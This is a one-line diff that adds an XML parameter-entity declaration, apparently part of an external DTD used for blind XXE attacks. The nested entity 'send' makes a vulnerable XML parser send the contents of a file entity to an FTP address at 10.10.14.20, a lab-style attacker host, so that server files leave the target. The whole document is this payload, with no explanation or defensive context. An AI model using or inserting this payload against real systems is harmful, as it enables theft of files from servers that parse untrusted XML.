@@ -1,0 +1,1 @@
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'ftp://10.10.14.20:80/%file;'>">
